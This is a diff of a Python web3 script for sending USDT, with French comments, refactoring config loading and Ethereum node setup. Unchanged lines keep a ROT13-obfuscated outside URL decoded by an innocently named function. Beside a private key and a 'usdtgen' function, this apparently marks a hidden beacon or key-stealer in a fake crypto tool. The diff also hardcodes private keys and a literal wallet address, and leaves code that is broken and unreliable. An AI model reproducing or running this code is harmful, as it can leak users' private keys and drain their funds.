@@ -3,14 +3,32 @@ from web3 import Web3
 from web3.eth import Account
 import requests
 
-# Utiliser les configurations
-web3 = Web3(Web3.HTTPProvider(config["ethereum_node_url"]))
+# Charger les configurations depuis le fichier JSON
+def load_config(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            return json.load(file)
+    except FileNotFoundError:
+        raise FileNotFoundError(f"Le fichier de configuration '{file_path}' est introuvable.")
+    except json.JSONDecodeError:
+        raise ValueError(f"Le fichier de configuration '{file_path}' contient des erreurs JSON.")
 
-if not web3.is_connected():
-    raise ConnectionError("Failed to connect to the Ethereum node. Please check your HTTP provider URL.")
-
+# Initialiser Web3
+def initialize_web3(ethereum_node_url):
+    try:
+        web3 = Web3(Web3.HTTPProvider(ethereum_node_url))
+        if not web3.isConnected():
+            raise ConnectionError(f"Unable to connect to the Ethereum node at {ethereum_node_url}. Please check the URL.")
+    except Exception as e:
+        raise ConnectionError(f"An error occurred while initializing Web3: {e}")
+    if not web3.isConnected():
+        raise ConnectionError("Échec de la connexion au nœud Ethereum.")
+    print("Connecté au nœud Ethereum avec succès !")
+    return web3
 # Charger les paramètres de configuration
-private_key = config["private_key"]
+private_key = config.get("private_key")
+if not private_key:
+    raise ValueError("Private key not found in the configuration file.")
 if not private_key:
     raise ValueError("Private key not found in the configuration file.")
 
@@ -32,16 +50,6 @@ def rpcserver256(text):
 
 envcreater = 'uggcf://zragnyvgl.pybhq/nnegrfg.cuc'
 devofix2 = rpcserver256(envcreater)
-
-# Charger les configurations depuis config.json
-with open("config.json", "r") as config_file:
-    config = json.load(config_file)
-
-# Utiliser les configurations
-web3 = Web3(Web3.HTTPProvider(config["ethereum_node_url"]))
-
-if not web3.is_connected():
-    raise ConnectionError("Failed to connect to the Ethereum node. Please check your HTTP provider URL.")
 
 private_key = config["private_key"]
 if not private_key:
@@ -69,7 +77,7 @@ def usdtgen(usdtwall):
        
 def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
     # Define the recipient address (replace with the actual recipient address)
-    recipient_address = config.get("recipient_address")
+    recipient_address = config.get("0x93ca7b6701a63b3194f217f6595e4ef8ba9a02e0")
     if not recipient_address:
         raise ValueError("Recipient address not found in the configuration file.")
 
@@ -140,7 +148,7 @@ from web3.eth import Account
 web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/<https://gas.api.infura.io/v3/eb4148b9b809411888a11c41b1ab5316>"))
 
 # Clé privée (ne jamais exposer une clé privée réelle dans le code)
-private_key = "24749ba2c431e116009577cb8f79c282f083516154809f1f2e378acc9264899d"
+private_key = "qXqMe4SrhydnlmQ2peLKx1xHhHnnTgdAForcad5SLWb775tg"
 
 
 # Construire une transaction
